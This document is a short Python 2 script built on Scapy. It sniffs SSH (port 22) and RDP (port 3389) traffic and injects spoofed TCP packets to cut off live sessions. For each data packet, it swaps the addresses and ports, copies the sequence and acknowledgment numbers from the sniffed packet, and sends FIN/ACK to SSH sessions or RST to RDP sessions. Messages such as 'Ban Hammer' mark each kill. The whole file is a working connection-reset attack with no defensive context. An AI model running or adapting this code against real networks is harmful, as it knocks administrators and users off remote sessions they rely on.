from scapy.all import *
from multiprocessing import Process
import time
import Queue

class sniffer(Process):
	def __init__(self, thequeue):
		super(sniffer, self).__init__()
		print "[!] Warming Engines"
		self.queue = thequeue
		self.last_seq = 0
		self.last_ack = 0
		self.lock = None

	def run(self):
		print '[!] Ignition Start'
		sniff(filter='tcp port 22 or tcp port 3389', prn=self.it)

	def flip(self, pkt):
		npkt = Ether()/IP()/TCP()	

		try:
			seq = len(pkt[TCP][1])
		except:
			seq = len(pkt[TCP])
		
		if pkt[TCP].sport == 22 or pkt[TCP].dport == 22:
			npkt[TCP].flags = 0x0011
		elif pkt[TCP].sport == 3389 or pkt[TCP].dport == 3389:
			npkt[TCP].flags = 0x0004
		
		if self.last_seq == pkt[TCP].ack:
			print 'Avoided Spurious transmission'
			return None
		#print 'Last seq', self.last_seq
		#print 'Last ack', self.last_ack
		npkt[TCP].sport = pkt[TCP].dport
		npkt[TCP].dport = pkt[TCP].sport
		npkt[TCP].seq = pkt[TCP].ack
		npkt[TCP].ack = pkt[TCP].seq + seq

		npkt[IP].src = pkt[IP].dst
		npkt[IP].dst = pkt[IP].src
		npkt[IP].flags = 'DF'
		npkt.src = pkt.dst
		npkt.dst = pkt.src
		self.last_seq = pkt[TCP].ack
		self.last_ack = pkt[TCP].seq + seq
		return npkt

		#recalc checksum
	def it(self, pkt):
		if pkt.haslayer(TCP):
			if pkt[TCP].flags == 0x0018 and pkt[TCP].flags != 0x0011 and pkt[TCP].flags != 0x0004:
				if pkt[TCP].sport in (22, 3389):
					print '[!] Server Ban Hammer'
					npkt = self.flip(pkt)
					if npkt != None:
						sendp(npkt)

				elif pkt[TCP].dport in (22, 3389):
					print '[!] Client Ban Hammer'
					npkt = self.flip(pkt)
					if npkt != None:
						sendp(npkt)

				else:
					return

			elif pkt[TCP].flags == 0x004:
				'[!] Reset Seen. Game Over...'
		else:
			pass


thequeue = Queue.Queue()
engine = sniffer(thequeue)
engine.daemon = True
engine.start()
time.sleep(0.2)
print '[!] Liftoff'
